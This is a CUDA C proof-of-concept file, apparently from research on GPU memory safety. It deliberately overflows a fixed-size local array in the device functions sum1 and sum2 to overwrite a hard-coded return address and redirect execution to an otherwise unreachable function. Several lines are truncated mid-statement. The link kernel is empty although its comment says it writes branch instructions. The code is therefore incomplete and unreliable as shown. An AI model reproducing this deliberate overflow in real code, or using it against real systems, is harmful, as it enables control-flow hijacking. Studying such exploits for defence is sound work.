#include "stdio.h"
#include "stdlib.h"
#include "fcntl.h"
#include "errno.h"
#include "inttypes.h"
#include "sys/mman.h"
#include "cuda_runtime.h"
#include "sched.h"
#include "unistd.h"

#define PAGE_SIZE (2*1024*1024)
#define PAGE_NUM 16
#define ALLOC_SIZE 1024*128

#define RET_ADDR 0x7fffd6fb2500
#define ARR_OFFSET (0xfffd24 - 0xfffcd0) / 4




typedef uint32_t(*pF)(uint32_t k, uint32_t*a, uint32_t depth, uint32_t value_ptr, ui>
extern int errno;



/*
    sum2 should never be executed (unless buffer overflow happens).
    The only difference between sum2 and sum1 is line 67; an extra "10" is added in >
*/
__device__ __noinline__
uint32_t sum2(uint32_t k, uint32_t*a,  uint32_t depth,  uint32_t value_ptr, uint32_t>
{
    uint32_t arr1[16];
    for(int i = 0; i < 16; i++){
        arr1[i] = 0xdeadbeef * a[i+depth];
    }
    arr1[arr_idx] = RET_ADDR - 0x7fff00000000;

    if(k > 0)
        return(a[value_ptr]+ sum2(k-1, a,  depth+1, value_ptr+1, arr_idx+ARR_OFFSET)>
    else
    {

        uint32_t m = 1;
        return m+a[value_ptr];
    }

}

/*
   sum1 provides the summation of cetain items in the buffer "a".
   arr1 does not contribute to the summation result, but it can trigger a buffer ove>
   depending on ARR_OFFSET.
   depth is used to avoid compiler optimization.
*/

__device__ __noinline__
uint32_t sum1(uint32_t k, uint32_t*a,  uint32_t depth,  uint32_t value_ptr, uint32_t>
{
    uint32_t arr1[16];
    for(int i = 0; i < 16; i++){
        arr1[i] = 0xdeadbeef * a[i+depth];
    }

    arr1[arr_idx] = RET_ADDR - 0x7fff00000000;

    if(k > 0)
        return(a[value_ptr] + sum1(k-1, a,  depth+1, value_ptr+1, arr_idx+ARR_OFFSET>
    else
    {

        uint32_t m = 1;
        return m+a[value_ptr];
    }

}


/*
   mem_init initiates the gpu buffer "a".
   k1 performs a summation over items within the range of a[0] to a[99].
   a[100] and a[101] are used to store some metadata for the summation.
*/
__global__
void mem_init (uint32_t *a, bool value)
{

    for(uint64_t x = 0; x < ALLOC_SIZE/sizeof(uint32_t); x++)
        a[x] = x%1;
    a[100] = 13; //a[100] stores value_idx for sum1.
    a[101] = 0;  //a[101] stores arr_idx for sum1.

}



__global__
void k1 (uint32_t* a, uint32_t* b, uint64_t* list_start)
{
    uint32_t m = 1;

    pF fp[2]; //use function pointer to get the function addrs.
    fp[0] = sum1;
    fp[1] = sum2;

    /* perform summation over two items in the buffer "a" */
    m = sum1(0x1, a, 0, a[100],a[101]);
    b[0] = m;

}


__global__ void
link(uint64_t *list)
{
}



int main()
{


    setvbuf(stdout, NULL, _IOLBF, 0);
    cudaError_t status;

    uint32_t *da;
    status = cudaMalloc((void**)&da, ALLOC_SIZE);
    if(status != cudaSuccess)
        printf("ERROR!!!\n");

    uint32_t *db;
    status = cudaMallocManaged((void**)&db, sizeof(uint32_t));
    if(status != cudaSuccess)
        printf("ERROR!!!\n");

    mem_init<<<1, 1>>>(da, 1);
    cudaDeviceSynchronize();

    uint64_t *list; //the linked data pages

    status = cudaMalloc(&list, PAGE_SIZE);
    if(status != cudaSuccess)
        printf("ERROR!!!\n");

    /* Fill the first (PAGE_NUM-1) pages with BRA instructions to link them. */
    link<<<1,1>>>(list);
    cudaDeviceSynchronize();


    k1<<<1, 1>>>(da, db, list);
    cudaDeviceSynchronize();


    status = cudaGetLastError();
    if(status != cudaSuccess)
        printf("%s\n", cudaGetErrorString(status));
    else
        printf("%u\n", db[0]);

    return 0;
}

